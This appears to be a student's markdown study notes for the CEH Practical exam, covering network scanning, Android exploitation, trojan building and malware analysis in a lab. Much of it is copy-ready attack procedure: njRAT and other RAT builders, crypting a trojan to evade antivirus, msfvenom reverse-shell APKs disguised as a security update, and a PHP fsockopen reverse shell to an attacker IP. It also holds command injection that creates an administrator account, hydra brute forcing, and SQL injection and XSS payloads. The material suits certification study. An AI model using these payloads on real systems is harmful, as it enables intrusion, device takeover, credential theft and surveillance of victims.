# CEH-Practical-Notes

# Network Hacking
<details>
  <summary>Netdiscover </summary>

* Scan Entire Network for ALive host using ARP
```console
netdiscover -i eth0
netdiscover -r x.x.x.1/24
```

</details>

<details>
  <summary>Nmap </summary>

* To scan the live Host
```console

nmap -sP x.x.x.0/24        	{Live host}
nmap -PR -sn x.x.x.0/24        	{Live host without port scan - ARP scan}
nmap -sC -sV x.x.x.0/24        	{Script + version}    
nmap -O x.x.x.x                 {To find the OS}
nmap -p- x.x.x.1/24        	{open port}
nmap -p port x.x.x.1/24 --open  {find the Specific open port}
nmap -T4 -A -v www.moviescope.com/x.x.x.10/24  {Aggressive scan}
nmap --script <script_name> -p <port> x.x.x.0/24 {using nse script}
nmap -sC -sV -p- -A -v -T4 x.x.x.0/24 {script+version+ports+os scan}
nmap -T4 -A -v -oN ouput.txt x.x.x.0/24  {Normal output in a file}

nmap -Pn -A x.x.x.1/24 -vv --open {Comprehensive Scan}
nmap -p 3389 -iL ip.txt | grep open (Check RDP enabled after getting ip)
nmap -p 3306 -iL ip.txt | grep open (Check MySQL service running)



nmap -sn x.x.x.0/24 -iL ips.txt {No of hosts up}

```
</details> 

# Android Hacking
<details>
  <summary>ADB</summary>

* To Install ADB
```console
apt-get update
sudo apt-get install adb -y
adb devices -l
```
* Connection Establish Steps

```console
adb connect x.x.x.x:5555
adb devices -l
adb shell  
```
* To navigate
```console
pwd
ls
cd Download
ls
cd sdcard
```
* Download a File from Android using ADB tool
```console
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
```
</details>


# Steganography
  <details>
    <summary>OpenStego</summary>

* To hide the Text in image

```console
Hide Data -> Message file -> text & Cover file -> image file
Output -> Desktop -> island -> Hide data
```

* To unhide the Hidden Text

```console
Extract Data -> Input -> islan.png
Output -> Desktop/NewTextDocument.txt
```

</details>

<details>
    <summary>Keywords</summary>

* Img hidden      - Openstego
* .hex            - Cryptool
* Whitespace      - SNOW
* MD5             - Hashcalc & MD5 Calculator
* Encoded         - BCTexteditor
* Volume & mount  - Veracrypt

</details>

# Malware threat analysis
<details>
<summary>Gain access to the target system using Trojans</summary>

```console

[W11] - attacker
	
Launch njRAT v0.7d.exe
port 5552
Click Builder (lower left -corner)
Enter Ip of attacker,check the optionRegisty StarUp and clickBuild.
Save As malacious.exe on Desktop and share

[WS22] - Victim
Copy malacious.exe to Desktop and Run

[W11]
Establishes a persistent connection with the victim machine
Right click on detected victim and click Manager
"Process Manager" -> Right click -> Kill/Delete/Restart
Connectoin -> Right click -> Kill Connection
Registry -> Right click -> associated registry files
Remote Shell -> launch remote conn on Win 22

cmd>ipconfig/all -> lower left conrner
Services -> start/pause/stop service
Close Manager window

Right click on victim name -> Remote Desktop (Launches remote connection)
select Mouse Checkbox -> remotely interact with the victim machine using the mouse.
Right click on victim name ->Remote Cam -> Microphone

[WS22]
As a victim perform some activity on machine, create a secret file and save.

[W11]
Right click on victim name -> Keylogger -> Able to view all keystrokes performed by victim
Right click on victim name -> open chat -> send msg to victim

```
</details>

<details>
<summary>Create a Trojan Server using Theef RAT Trojan</summary>
    Allows remote access to the system via port 9871 & 6703.

```console
[WS22] - Victim
Run Theef/Server210.exe 

[W11] - Attacker
Run Theef/Client210.exe
Victims ip & port 6703 
Estblish connection and perform activity, client will track all.
Computer info/ PC details/Home/Nw Info
```
</details>

<details>
<summary>Create a Virus using JPS virus maker tool and infect the target system</summary>

Features - auto-start/shutdown/disable security check, lock mouse, keyboard, destroy protected storage & terminate windows

```console

[Win11]
Luaunch JPS executable
Selection options you with to do --> Righ Arrow -> To change windows password & other --> right arrow for more features
Create virus
Share the virus created

[WS19]
Launch virus created
Open task manager - its disable - to verify
Restart to see pwd change affected
```
</details>
<details>
<summary>Hide a Trojan using SwayzCrypto</summary>

```console

[W11]
https://www.virustotal.com -> upload & see no of vul identified -> 59/69 vul shows
Run SwayzCryptor.exe ->Select file -> Desktop/Test.exe ->check the optionsStart up,Mutex, andDisable UAC, and then clickEncrypt.
Save file dialog -> cryptedfile.exe 
https://www.virustotal.com -> upload crypted.exe -> confirm upload -> only few anivirus will detect its malacious file

Start njRAT v0.7d.exe
Share CryptedFile.exe via shared folder

[WS22]
copy crypted.exe from shared to desktop -> run -> Attacker machine establishes a persistent connection with the victim machine.

[W11]
can observe that the connection has been established with the victim machine.

```

</details>

<details>
<summary>Capture and Analyze IoT Traffic using Wireshark</summary>

```console
[WS19]
Launch \Bevywise IoT Simulator\Bevywise_MQTTRoute_Win_64.exe file.
Command prompt will appear, can see the TCP port using 1883.

To create IoT devices, we must install the IoT simulator on the client machine.
[WS22]

Launch \Bevywise IoT Simulator\Bevywise_IoTSimulator_Win_64.exe
Launch C:\Bevywise\IotSimulator\bin\runsimulator.bat -> select Microsoft Edge browser and click OK to open the URL http://127.0.0.1:9000/setnetwork?network=HEALTH_CARE.
View the default network named HEALTH_CARE and several devices.

Create a virtual IoT network and virtual IoT devices. 
select the +New Network option.
CEH_NETWORK -> Create 
Broker IP Address as: [WS19_IP]
- the created network will interact with the server using MQTT Broker.

Add blank Device
Device name:Sensor, enter Device Id:TS1, Description and click on Save.
To connect the Network and the added devices to the server or Broker, click on the Start Network red color circular icon in right corner.

When a connection is established between the network and the added devices and the web server or the MQTT Broker, the red button turns into green.

[Ws19]
can see a connection request from machine WS22 machine for the device TS1.

[WS22]
Create Subscribe command for the device Sensor.
Click on the Plus icon in the top right corner and select the Subscribe to Command option.
The Subscribe for command - TS1 popup opens. Select On start under the Subscribe on tab, type High_Tempe under the Topic tab, and select 1 Atleast once below the 
Qos option. Click on Save.
can see the Topic added under the Subscribe to Commands section.
 will capture the traffic between the virtual IoT network and the MQTT Broker to monitor the secure communication.

 Wireshark
 Note: Make sure you have selected interface which has WS22 as the IP address.

[WS19]
Chrome - http://localhost:8080

Signin
Devices Menu 
send the command to TS1 using the High_Tempe topic.
Command Send section, select Topic as High_Tempe, type Alert for High Temperature and click on the Send button.

[S22]
Verify the message is received

wireshark
filter: mqtt

```
</details>

<details>
<summary>malware analysis</summary>

* Static malware analysis using hybrid

   https://www.hybrid-analysis.com -> upload virus and analyse

* Strings search using BinText
 
[WS11]
    
Run bintext.exe ->String searching tool
select Advance view
select "malacious.exe" from shared drive


* Identify packaging and obfuscation methods using PEid

[W11]

Launch PEiD.exe
Open virus file
click Open, PEiD analyzes the file and provides information


* Analyze ELF executable file using Detect It Easy (DIE)

Detect It Easy automatically scans the file and result appears showing the Operating system, compiler and language details in the middle pane

[W11]

Launch die.exe
Open ELF Test File
File info/Hash/Entropy and other details


* Portable executable (PE) information of a malware executable file using PE Explorer

Launch PE.Explorer_setup.exe
Open virus.exe
On top
Data Directories ->to view and edit the virtual address and size of the chosen directory describing provisions of parts of the code.
Section Headers->


* File dependencies using Dependency Walker

Launch depends.exe
open file.exe
Observer Import and Export section.


* Malware disassembly using IDA

[W11]

Launch IDA Freeware
IDA: Quick start -> New -> select malicious file
Portable executable for 80386 (PE) [pe64.dll] option selected -> OK
IDA View-A tab -> Right click -> Text view

Disassembling and Debugging Tools\IDA, Copy the qwingraph.exe file and paste it in IDA’s installation location. C:\Program Files\IDA Freeware 7.7
IDA-> View-> Graphs-> Flow Chart
View -> Graphs -> Function calls
HexView-1tab -> view hex value of the malicious file
Structure
Enums

* Malware disassembly using OllyDbg

Launch OLLYDBG.EXE

File file.exe
Output appears in -> CPU - main thread, module tini

View-> Log
Log data appears ->displays the program entry point and its calls to known functions

View->Executable modules
View->Memory
View->Thread


* Malware disassembly using Ghidra

Run ghidraRun.bat

If a Command Prompt window appears, then type C:\Program Files\jdk-17.0.2+8 and press Enter
Ghidra: NO ACTIVE PROJECT -> File -> New Project
Non-Shared Project -> Proj Name: Malware Analysis -> Finish
File->Import file -> file.exe -> Import Result Summary -> OK

file.exe is added as a children node under the Malware Analysis project
Double click file.exe -> Analyse -> Yes
under Symbol Tree, you can observe various components of face.exe file such as Imports, Exports, Functions and Labels

Expand Imports -> view DLL files

Program Tree->Headers double click
-> Double click .rdata

</details>

#Web server hacking
<details>
	<summary>using Nmap Scripting Engine (NSE)</summary>
	
	```console
	[linux]
	nmap -sV --script=http-enum [target]
	 
	To discover the hostnames that resolve the targeted domain.
	nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- [target]

	Perform HTTP trace on the targeted domain
	nmap --script http-trace -d [target]
	This script will detect a vulnerable server that uses the TRACE method by sending an HTTP TRACE request that shows if the method is enabled or not.

	check whether Web Application Firewall is configured on the target host or domain
	nmap -p80 --script http-waf-detect [Target]
	determine whether a web server is being monitored by an IPS, IDS, or WAF.
	This command will probe the target host with malicious payloads and detect the changes in the response code
        ```
	<summary>Linux </summary>
 	sudo su
	
	uniscan -h
	uniscan -u [target-url] -q
	-q -> to search for the directories of the web server.
	
	uniscan -u [target-url] -we
	Here -w and -e are used together to enable the file check (robots.txt and sitemap.xml file).
	
	uniscan -u [target-url] -d
	to start a dynamic scan on the web server.
	obtaining more information about email-IDs, Source code disclosures, and external hosts, web backdoors, dynamic tests.
	
	File system ->
	usr --> share --> uniscan --> report.
 
</details>

#Reference
* Analyze IOT device
https://ceh-practical.cavementech.com/module-18.-iot-and-ot-hacking/2.-capture-and-analyze-iot-traffic

#  Mobile Hacking
<details>
	<summary># Exploit the Android Platform through ADB using PhoneSploit</summary>
	```console


 	```
</details>

<details>
	<summary># Exploit the Android Platform through ADB using PhoneSploit</summary>
	```console

	[Linux]
	sudo su
	cd PhoneSploit
	python3 -m pip install colorama
	python3 phonesploit.py
	3  	-> Connect a new phone
	Enter a phones ip address: [andoirdIP]
	connection time out error :  Type 3 continue until u get Phone Ip address option
	Connected at port 5555
	
	(main_menu)> 4  	-> Access Shell on a phone
	Device name: [AndroidIP]
	pwd		-> Root dir
	ls
	cd sdcard
	ls
	cd Download
	ls
	
	Note: Note down the location of images.jpeg (in this example, /sdcard/Download/images.jpeg). We will download this file in later steps.
	exit
	
	(main_menu)>7    ->Screen Shot a picture on a phone.
	[AndoridIP]
	/home/attacker/Desktop		-> save, screen.png is stored in Desktop
	
	(main_menu)>14 	 ->list all apps on the phone
	[AndoridIP]
	(main_menu)>15 	 ->choose Run an app
	com.android.calculator2
	
	[android]
	see that the calculator app is running, and that random values have been entered
	```
</details>

<details>
	<summary># Hack an Android Device,Creating Binary Payloads</summary>
	
	```console
 	[Linux]
    	sudo su
	cd
	service postgresql start
	msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[PIP] -R > Desktop/Backdoor.apk 
	mkdir /var/www/html/share
	chmod -R 755 /var/www/html/share
	chown -R www-data:www-data /var/www/html/share
	service apache2 start
	cp /root/Desktop/Backdoor.apk /var/www/html/share/
	msfconsole
	use exploit/multi/handler
	show options
	set LHOST [PIP]
	exploit -i -z  -> run exploit as background job
	
	[Android]
	launch http://[PIP]/share
	download and run Backdoor.apk
	
	[Linux]
	The meterpreter session has been opened successfully
	sessions -i 1
	sysinfo
	ipconfig
	pwd
	cd /sdcard 
	pwd -> /storage/emulated/0.
	ps
 	```
</details>
    
<details>
	<summary># Hack an Android Device,Creating APK File - AndroRAT</summary>
	
	```console
	[linux]
	sudo su 
	cd AndroidRat
	python3 androidRAT.py --build -i [PIP] -p 4444 -o SecurityUpdate.apk
	--build: is used for building the APK
	-i: specifies the local IP address
	cp /home/attacker/AndroidRAT/SecurityUpdate.apk /var/www/html/share
	service apache2 start
	python3 androidRAT.py --shell -i 0.0.0.0 -p 4444
        --shell: is used for getting the interpreter
        -i: specifies the IP address for listening (here, 0.0.0.0)

	[Android]
	launch http://[PIP]/share
	save and open SecurityUpdate.apk
	
	[parrot]
	Interpreter session has been opened successfully.
	help
	deviceinfo
	getSIM inbox
	getMACAddress
	exit
 	```
</details>  


# Web Application hacking

<details>
	<summary>Banner grabbing</summary>
	
	```console
 	   nmap -T4 -A -v [Target Web Application] 
     	   OR
	   telnet www.moviescope.com 80
	   GET / HTTP/1.0
	```
</details>

<details>
	<summary>Reconinanace using whatweb</summary>
	
	```console
	  whatweb -v [Target] 
	  whatweb --log-verbose=Report www.moviescope.com
	```
</details>

<details>
<summary>Web Server Directories</summary>
	
```console
 nmap -sV --script=http-enum
 look under http-enum
 Find dirs
 gobuster dir -u [Target Website] -w /home/attacker/Desktop/common.txt

 OR
 python3 dirsearch.py -u [Target]
 python3 dirsearch.py -u http://www.moviescope.com -e aspx   {spec extn}
 python3 dirsearch.py -u http://www.moviescope.com -x 403    {dir bruteforce excluding port 403}

``` 
</details>
<details><summary>Hack a Web Application using WPScan and Metasploit</summary>

```console

    [WS22]
    Launch wampserver

	[parrot]
	sudo su
	cd
	wpscan --api-token [API Token] --url http://[WSIP]:8080/CEH --enumerate u
	--enumerate u: specifies the enumeration of usernames.

	Obtained the usernames stored in the database.

    To find user's passwords.

	service postgresql start -> first start the PostgreSQL service.
	msfconsole
	use auxiliary/scanner/http/wordpress_login_enum 
	show options
	set PASS_FILE /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt 
	set RHOSTS [WIP]
	set RPORT 8080
	set TARGETURI http://[WSIP]:8080/CEH 
	set USERNAME admin -> take any username obtained from above
	run
```
</details>

<details>
<summary>Perform remote os command injection (dvwa web) and get the content from pin file</summary>

```console
    [Win 11]
	http://[WSIP]:8080/dvwa/login.php
	test/abc123
	Command Injection
	
	Ping a device - [W22IP] -> successfully pings the target machine
	Try with ;/&&/&/ 
	| hostname          -> error -> Change security level to low
	| hostname 			-> return machine name, any other details from the system   
	| whoami
	| tasklist 			-> to view the processes running on the machine.
	| Taskkill /3112 /F -> Forcefully terminate the process

	/F- Forecefully terminate
	
	| dir C:\ 			-> files and directories on C:\
	| net user  		-> User account information
	| net user Test /Add ->	Attempt to add a user account remotely.
	| net user 			-> View the new user account
	| net user Test 	-> new account information
	
	Does not have administrative privileges. It has an entry called Local Group Memberships.
	
	| net localgroup Administrators Test/Add  -> To grant administrative privileges
	| net user Test     -> Test is now an administrator account under the Local Group Memberships option.
		
	Check able to connecto to Target machine with new user with RDC
	RDC -> [Target IP]
	Username: Test - connect
```
</details>

<details>
<summary>Perform file upload (dvwa web)</summary>

```console
    
	[linux]
	sudo su
	cd
	msfvenom -p php/meterpreter/reverse_tcp LHOST=[PIP] LPORT=444 -f raw
	Copy payload and paste it into upload.php
		
	Open http://WSIP:8080/dvwa/login.php
	admin/password
	security - low
	File upload - upload the upload.php
	
	[linux]
	sudo su
	cd
	msfconsole
	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set LHOST [PIP]
	set LPORT 444
	run
	
	Firefox
	Open http://[WSIP]:8080/dvwa/hackable/uploads/upload.php
	
	Terminal - Meterpreter session has successfully been established with the victim system
	sysinfo
	
	----
	if securty set to high
	File upload - upload the high.jpeg
	
	Command Injection
	Ip address: |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php + Submit
	
	Terminal
	sudo su
	cd
	msfconsole
	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set LHOST [PIP]
	set LPORT 2222
	run 
	
	Firefox: http://[WSIP]:8080/dvwa/hackable/uploads/shell.php
	Terminal: Meterpreter session has successfully been established with the victim system.
	sysinfo
```

</details>

<details>
<summary>DVWA</summary>

```conose
hydra -l admin -p pasword 10.0.0.49 http-post-form="/login.php:username=admin&password=^PASS^&Login=Submit:Login failed"

hydra 10.0.0.49 http-form-post "/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -l admin -p password

NOT WORKING
hydra 10.0.0.49 http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:H=cookie\:PHPSESSID=hokuv28srabuqss7p766lttp75; security=low:F=Login failed" -l admin -P /home/sbkali/Downloads/pass.txt

1. Vul - Brute-force 
security=low
hydra 10.0.0.49 http-form-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=cookie\:PHPSESSID=hokuv28srabuqss7p766lttp75; security=low:F=Username and/or password incorrect." -l admin -P /home/sbkali/Downloads/pass.txt

security=medium
hydra 10.0.0.49 http-form-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=cookie\:PHPSESSID=hokuv28srabuqss7p766lttp75; security=medium:F=Username and/or password incorrect." -l admin -P /home/sbkali/Downloads/pass.txt -V -I --> verbose

security=high
NOT WORKING
------------------------------------------------------------------------------------------------------------------------
Command Injection

check which char is accepting ;/&/|/||/&&

low
localhost
localhost | whoami
localhost | php -r '$sock=fsockopen("10.0.0.16",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

nc -nvlp 4444

medium

localhost | php -r '$sock=fsockopen("10.0.0.16",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

high
change secrity by intercepting then it will work
------------------------------------------------------------------------------------------------------------------------
File upload
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.16 LPORT=444 -f raw > shell.php

msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.0.16
set LPORT 444
exploit

1. update Content-Type: image/jpeg 

Upload shell.php -> File is uploaded
Now access that file by entering the full path 10.0.0.49/hackable/uploads/../../hackable/uploads/shell.php

Reverse shell is open in msfconsole
sysinfo
whoami
pwd

High
add GIG 98 to shell.php
mv shell.php shell.php.jpeg
Similary intercept the req and update the security it will work for all. if only jpeg accepted then intercept and update Content-Type: image/jpeg -
------------------------------------------------------------------------------------------------------------------------
' or 1=1#   - Displays result

Find no of columns --> 2
' order by 1# - No error
' order by 1# - No error
' order by 3# -- error

' union select @@version, null#  --> 10.1.26-MariaDB-0+deb9u1
' or 0=0 union select null, user() #
' or 0=0 union select null,concat(user, password) from users #

First name: admin
Surname: admin

SQLMAP

1. sqlmap -u "http://10.0.0.49/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs --cookie="PHPSESSID=hokuv28srabuqss7p766lttp75; security=low" --batch
available databases [2]:
[*] dvwa
[*] information_schema

2. sqlmap -u "http://10.0.0.49/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa --cookie="PHPSESSID=hokuv28srabuqss7p766lttp75; security=low" --batch --dump-all

Blind Injection
' or sleep(5)#
1 or sleep(5)#

1 1=0 and union select null, concat(user,password) from users #
-------------------------------------------------------------------------------------------------------------
XSS-DOM
alert(1)
Medium: </select><video><source onerror="javascript:alert(1)"></video>
High: #<script>alert(1)</script>  --> commented javascript

Reflected

Low: <script>alert(1)</script>
Medium : <img src=x onerror=alert(1)>
High: <img src=x onerror=alert(1)>

Stored
low: <script>alert(1)</script>
medium: <img src=x onerror=alert(1)>
high: <img src=x onerror=alert(1)>
-------------------------------
echo -n "token" | wc -c --> 32
echo 'ChangeMe' | tr 'A-Za-z' 'N-ZA-Mn-za-m''
PunatrZr
echo -n "PunatrZr"| md5sum  -> same token 

echo 'success' | tr 'A-Za-z' 'N-ZA-Mn-za-m''
dsfsdf
echo -n "dsfsdf"| md5sum  -> diff token

put success and add diff token in burpsuit

```
</details>
